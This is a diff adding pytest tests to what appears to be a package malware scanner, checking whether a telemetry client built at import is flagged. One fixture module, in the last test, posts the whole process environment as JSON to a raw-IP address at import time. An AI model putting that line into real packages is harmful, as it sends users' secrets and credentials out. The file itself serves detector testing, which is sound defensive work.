@@ -204,3 +204,47 @@ class TestTheGradesBlock:
         setup = "from setuptools import setup\nsetup(name='demo')\n"
         rules = self.rules(self.sdist(tmp_path, setup, {"up.py": lib}))
         assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" not in rules
+
+
+class TestADestinationOnlyWrittenAtImport:
+    """evidently 0.7.23: a telemetry client constructed at import with a raw-IP `url=` and an
+    opt-out flag read from the environment is a destination named, not a send. Posting the
+    environment to the same address at import is a send."""
+
+    @staticmethod
+    def rules(tmp_path: Path, module: str) -> set[str]:
+        members = {
+            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
+            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
+            "src/telem/__init__.py": "__version__ = '1.0'\nfrom . import telemetry\n",
+            "src/telem/telemetry.py": module,
+        }
+        archive = tmp_path / "telem-1.0.tar.gz"
+        with tarfile.open(archive, "w:gz") as tgz:
+            for name, text in members.items():
+                data = text.encode("utf-8")
+                info = tarfile.TarInfo(f"telem-1.0/{name}")
+                info.size = len(data)
+                tgz.addfile(info, io.BytesIO(data))
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+        return {f.rule_id for f in result.findings}
+
+    def test_a_telemetry_client_built_at_import_is_not_exfiltration(self, tmp_path: Path) -> None:
+        module = (
+            "import os\nimport telem\nfrom telemlib import TelemetryLogger\n"
+            "DO_NOT_TRACK_ENV = 'DO_NOT_TRACK'\n"
+            "event_logger = TelemetryLogger('telem', telem.__version__,\n"
+            "    url='http://35.0.0.5:8000/api/v1/event', token='s',\n"
+            "    enabled=lambda: not os.environ.get(DO_NOT_TRACK_ENV, None))\n"
+            "def main():\n    event_logger.send_event('start')\n"
+        )
+        rules = self.rules(tmp_path, module)
+        assert "MALWARE.EXFIL.001" not in rules
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in rules
+
+    def test_the_environment_posted_at_import_still_blocks(self, tmp_path: Path) -> None:
+        module = (
+            "import json, os, urllib.request\n"
+            "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict(os.environ)).encode())\n"
+        )
+        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)
